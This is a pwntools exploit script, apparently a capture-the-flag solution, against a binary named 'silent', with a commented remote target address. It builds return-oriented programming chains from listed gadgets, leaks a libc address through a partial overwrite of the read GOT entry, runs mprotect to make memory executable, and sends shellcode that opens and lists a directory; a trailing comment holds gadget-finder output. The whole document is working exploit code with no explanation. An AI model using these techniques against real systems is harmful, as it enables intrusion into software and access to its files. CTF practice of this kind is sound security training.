from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

def pwn():

    ret=0x400696
    pop_rdi=0x400963
    pop_rsi_r15=0x400961
    main=0x400879
    pop_rbp=0x400788
    bss_addr=0x601800
    pop_rsp_r13_r14_r15=0x40095d
    read_plt=elf.plt[b"read"]


    # for i in range(2):
    #     payload=cyclic(0x48)+p64(main)
    #     io.send(payload)


    # payload=p64(elf.got[b"read"])*0x10
    # io.send(payload)

    gdb.attach(io)
    pause()

    payload=p64(bss_addr)*9+p64(ret)*0xb+p64(pop_rdi)+p64(1)+p64(pop_rsi_r15)+p64(elf.got[b"read"])*2+b"\x30\xf1\x8d"
    io.send(payload)

    leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-libc.sym[b"read"]
    print("leak_addr: " + hex(leak_addr))

    open_a=leak_addr+libc.sym[b"open"]
    read_a=leak_addr+libc.sym[b"read"]
    write_a=leak_addr+libc.sym[b"write"]
    mprotect_a=leak_addr+libc.sym[b"mprotect"]
    pop_rdx=leak_addr+0x1b96
    syscall_ret=leak_addr+0x0b1165
    pop_rax=leak_addr+0x1ced0


    payload=p64(bss_addr)*9+p64(ret)*0xb+p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(bss_addr)*2+p64(read_plt)+p64(0x400720)
    io.send(payload)
    
    payload=asm(shellcraft.open('.'))+asm(shellcraft.getdents64('rax', 0x601b00, 0x200))+asm(shellcraft.write(1, 0x601b00, 0x200))

    io.send(payload)

    mpp=p64(pop_rdi)+p64(0x601000)+p64(pop_rsi_r15)+p64(0x1000)+p64(0)+p64(pop_rdx)+p64(7)+p64(mprotect_a)+p64(0x400720)

    payload=p64(bss_addr)*9+mpp
    io.send(payload)

    # gdb.attach(io)
    # pause()

    payload=p64(bss_addr)*10
    io.send(payload)
    
    print(io.recv())
    

while True:
    try:
        io=process("./silent")
        #io=remote("172.10.0.8",9999)
        elf=ELF("./silent")
        libc=elf.libc
        pwn()
        
    except:
        io.close()
        continue




# Gadgets information
# ============================================================
# 0x0000000000400876 : leave ; ret
# 0x00000000004007e2 : mov byte ptr [rip + 0x20084f], 1 ; pop rbp ; ret
# 0x00000000004008f7 : mov eax, 0 ; leave ; ret
# 0x000000000040095c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040095e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400960 : pop r14 ; pop r15 ; ret
# 0x0000000000400962 : pop r15 ; ret
# 0x000000000040095b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040095f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400788 : pop rbp ; ret
# 0x0000000000400963 : pop rdi ; ret
# 0x0000000000400961 : pop rsi ; pop r15 ; ret
# 0x000000000040095d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400696 : ret

# Unique gadgets found: 14
